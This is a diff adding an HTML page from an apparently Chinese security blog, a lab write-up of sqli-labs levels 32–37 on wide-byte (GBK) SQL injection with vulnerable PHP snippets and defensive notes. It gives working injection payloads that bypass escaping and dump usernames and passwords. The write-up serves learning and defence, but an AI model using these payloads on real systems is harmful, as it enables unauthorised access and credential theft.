@@ -1,0 +1,288 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SQL:sqlilabs-less-32-37-宽字节注入 - H3ng</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ng,"> 
+    <meta name="description" content="Less-32代码中含有：
+function check_addslashes($string)
+{
+    $string = preg_replace(&#39;/&#39;. preg_quote(&#39;\\&#39;),"> 
+    <meta name="author" content="H3ng"> 
+    <link rel="alternative" href="atom.xml" title="H3ng" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ng</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">SQL:sqlilabs-less-32-37-宽字节注入</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">SQL:sqlilabs-less-32-37-宽字节注入</h1>
+        <div class="stuff">
+            <span>一月 25, 2021</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><p>代码中含有：</p>
+<pre><code>function check_addslashes($string)
+{
+    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);
+    //过滤反斜线符号
+    $string = preg_replace('/\'/i', '\\\'', $string);   
+    //用反斜杠转义单引号
+    $string = preg_replace('/\"/', "\\\"", $string);
+    //用反斜杠转义双引号
+    return $string;
+}
+$id=check_addslashes($_GET['id']);
+mysql_query("SET NAMES gbk");
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+print_r(mysql_error());</code></pre>
+<h5 id="其中三个preg-replace-函数分别为："><a href="#其中三个preg-replace-函数分别为：" class="headerlink" title="其中三个preg_replace()函数分别为："></a>其中三个preg_replace()函数分别为：</h5><pre><code>1.过滤反斜线符号
+2.用反斜杠转义单引号
+3.用反斜杠转义双引号</code></pre>
+<p>即：函数为过滤 ‘ \ 的函数，将 ‘ 转为 ' ， 将 \ 转为 \ ，将 “ 转为 "。</p>
+<h5 id="此此处我们只能考虑background中的第一个思路，添加一个-df后，将-5c吃掉即可。"><a href="#此此处我们只能考虑background中的第一个思路，添加一个-df后，将-5c吃掉即可。" class="headerlink" title="此此处我们只能考虑background中的第一个思路，添加一个%df后，将%5c吃掉即可。"></a>此此处我们只能考虑background中的第一个思路，添加一个%df后，将%5c吃掉即可。</h5><p>因此进行尝试：</p>
+<pre><code>?id=1'
+Hint: The Query String you input is escaped as : 1\'
+The Query String you input in Hex becomes : 315c27</code></pre>
+<p>因此爆数据库：</p>
+<pre><code>?id=-1%df' union select 1,(select group_concat(schema_name) from information_schema.schemata),3--+</code></pre>
+<p>跳过步骤直接爆信息：</p>
+<pre><code>?id=-1%df' union select 1,(select group_concat(username,0x3a,password) from users),3--+</code></pre>
+<h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><p>代码中含有：</p>
+<pre><code>function check_addslashes($string)
+{
+    $string= addslashes($string);    
+    return $string;
+}
+
+$id=check_addslashes($_GET['id']);
+mysql_query("SET NAMES gbk");
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+print_r(mysql_error());</code></pre>
+<h3 id="介绍addslashes-函数："><a href="#介绍addslashes-函数：" class="headerlink" title="介绍addslashes()函数："></a>介绍addslashes()函数：</h3><p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
+<p>预定义字符是：</p>
+<ul>
+<li>单引号（’）</li>
+<li>双引号（”）</li>
+<li>反斜杠（\）</li>
+</ul>
+<p>提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</p>
+<p>addslashes()函数和我们在32关实现的功能基本一致的，所以我们依旧可以利用%df进行绕过。</p>
+<h4 id="Notice："><a href="#Notice：" class="headerlink" title="Notice："></a>Notice：</h4><p>使用addslashes(),我们需要将mysql_query设置为binary的方式，才能防御此漏洞。</p>
+<pre><code>mysql_query("SET character_set_connection=gbk,character_set_result=gbk,character_set_client=binary",$conn);</code></pre>
+<h4 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h4><p>与less-32一致</p>
+<pre><code>?id=-1%df' union select 1,database(),3--+</code></pre>
+<h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><p>代码中含有：</p>
+<pre><code>$uname1=$_POST['uname'];
+$passwd1=$_POST['passwd'];
+
+$uname = addslashes($uname1);
+$passwd= addslashes($passwd1);
+
+mysql_query("SET NAMES gbk");
+@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";</code></pre>
+<p>可见这里对name和password进行了post和addslashes处理，%df可以将转义的反斜杠给吃掉。而GET型的方式我们是以url形式提交的，因此数据会通过urlencode如何将方法用在post型的注入当中，我们此处介绍一个新的方法。将utf-8转换为utf-16或 utf-32，例如将 ‘ 转为utf-16为 �’ 。我们就可以利用这个方式进行尝试。</p>
+<h4 id="我tm直接给你全整出来："><a href="#我tm直接给你全整出来：" class="headerlink" title="我tm直接给你全整出来："></a>我tm直接给你全整出来：</h4><pre class=" language-1"><code class="language-1">�'union select 1,group_concat(username,0x3a,password) from users#</code></pre>
+<h4 id="双查询同样也行"><a href="#双查询同样也行" class="headerlink" title="双查询同样也行:"></a>双查询同样也行:</h4><pre><code>�' union select count(*), concat((select database()), floor(rand()*2))as a from information_schema.tables group by a#</code></pre>
+<h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><p>源代码：</p>
+<pre><code>function check_addslashes($string)
+{
+$string = addslashes($string);
+return $string;
+}
+
+$id=check_addslashes($_GET['id']);
+mysql_query("SET NAMES gbk");
+$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";</code></pre>
+<h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><pre><code>?id=-1 union select 1,database(),3--+</code></pre>
+<h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><p>源代码：</p>
+<pre><code>function check_quotes($string)
+{
+    $string= mysql_real_escape_string($string);    
+    return $string;
+}
+$id=check_quotes($_GET['id']);
+mysql_query("SET NAMES gbk");
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+print_r(mysql_error());</code></pre>
+<p>可以看到这边就不是用addslashes了，用的mysql_real_escape_string()函数进行的过滤。</p>
+<h3 id="mysql-real-escape-string-函数："><a href="#mysql-real-escape-string-函数：" class="headerlink" title="mysql_real_escape_string()函数："></a>mysql_real_escape_string()函数：</h3><p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</p>
+<p>下列字符受影响：</p>
+<ul>
+<li>\x00</li>
+<li>\n</li>
+<li>\r</li>
+<li>\</li>
+<li>‘</li>
+<li>“</li>
+<li>\x1a</li>
+</ul>
+<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p>
+<p>但是因mysql我们并没有设置成gbk，所以mysql_real_escape_string()依旧能够被突破。方法和上述是一样的。</p>
+<h5 id="1-df突破法："><a href="#1-df突破法：" class="headerlink" title="1.%df突破法："></a>1.%df突破法：</h5><pre><code>?id=-1%df' union select 1,user(),3--+</code></pre>
+<h5 id="2-utf-16突破："><a href="#2-utf-16突破：" class="headerlink" title="2.utf-16突破："></a>2.utf-16突破：</h5><pre><code>?id=-1%EF%BF%BD%27union select 1,user(),3--+</code></pre>
+<h4 id="设置mysql为gbk"><a href="#设置mysql为gbk" class="headerlink" title="设置mysql为gbk"></a>设置mysql为gbk</h4><pre><code>mysql_set_charset('gbk','$conn')</code></pre>
+<h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><p>源代码:</p>
+<pre><code>$uname1=$_POST['uname'];
+$passwd1=$_POST['passwd'];
+
+$uname = mysql_real_escape_string($uname1);
+$passwd= mysql_real_escape_string($passwd1);
+
+mysql_query("SET NAMES gbk");
+@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";</code></pre>
+<p>大体上和less-34相同，这里处理post内容用的是mysql_real_escape_string()函数，而不是addslashes()函数，用万能密码：</p>
+<pre><code>�'union select 1,group_concat(username,0x3a,password) from users#</code></pre>
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>从上面的几关当中，可以总结一下过滤 ‘ \  常用的三种方式是使用preg_replace()直接replace，addslashes()，mysql_real_escape_string()。三种方式仅仅依靠一个函数是不能完全防御的，所以我们在编写代码的时候需要考虑的更加仔细。同时在上述过程中，我们也给出三种防御的方式：</p>
+<ul>
+<li><p>使用preg_replace()直接replace时，不要将mysql编码设置为gbk。</p>
+</li>
+<li><p>使用addslashes()时，我们需要将mysql_query设置为binary的方式，才能防御此漏洞</p>
+</li>
+<li><p>使用mysql_real_escape_string()时，需要将mysql设置为gbk即可。</p>
+</li>
+</ul>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-32"><span class="toc-number">1.</span> <span class="toc-text">Less-32</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B6%E4%B8%AD%E4%B8%89%E4%B8%AApreg-replace-%E5%87%BD%E6%95%B0%E5%88%86%E5%88%AB%E4%B8%BA%EF%BC%9A"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">其中三个preg_replace()函数分别为：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A4%E6%AD%A4%E5%A4%84%E6%88%91%E4%BB%AC%E5%8F%AA%E8%83%BD%E8%80%83%E8%99%91background%E4%B8%AD%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E6%80%9D%E8%B7%AF%EF%BC%8C%E6%B7%BB%E5%8A%A0%E4%B8%80%E4%B8%AA-df%E5%90%8E%EF%BC%8C%E5%B0%86-5c%E5%90%83%E6%8E%89%E5%8D%B3%E5%8F%AF%E3%80%82"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">此此处我们只能考虑background中的第一个思路，添加一个%df后，将%5c吃掉即可。</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-33"><span class="toc-number">2.</span> <span class="toc-text">Less-33</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8Daddslashes-%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">介绍addslashes()函数：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Notice%EF%BC%9A"><span class="toc-number">2.1.1.</span> <span class="toc-text">Notice：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload"><span class="toc-number">2.1.2.</span> <span class="toc-text">payload:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-34"><span class="toc-number">3.</span> <span class="toc-text">Less-34</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%88%91tm%E7%9B%B4%E6%8E%A5%E7%BB%99%E4%BD%A0%E5%85%A8%E6%95%B4%E5%87%BA%E6%9D%A5%EF%BC%9A"><span class="toc-number">3.0.1.</span> <span class="toc-text">我tm直接给你全整出来：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8C%E6%9F%A5%E8%AF%A2%E5%90%8C%E6%A0%B7%E4%B9%9F%E8%A1%8C"><span class="toc-number">3.0.2.</span> <span class="toc-text">双查询同样也行:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-35"><span class="toc-number">4.</span> <span class="toc-text">Less-35</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#payload-1"><span class="toc-number">4.0.0.1.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-36"><span class="toc-number">5.</span> <span class="toc-text">Less-36</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql-real-escape-string-%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">5.1.</span> <span class="toc-text">mysql_real_escape_string()函数：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-df%E7%AA%81%E7%A0%B4%E6%B3%95%EF%BC%9A"><span class="toc-number">5.1.0.1.</span> <span class="toc-text">1.%df突破法：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-utf-16%E7%AA%81%E7%A0%B4%EF%BC%9A"><span class="toc-number">5.1.0.2.</span> <span class="toc-text">2.utf-16突破：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AEmysql%E4%B8%BAgbk"><span class="toc-number">5.1.1.</span> <span class="toc-text">设置mysql为gbk</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-37"><span class="toc-number">6.</span> <span class="toc-text">Less-37</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Summary"><span class="toc-number">7.</span> <span class="toc-text">Summary</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
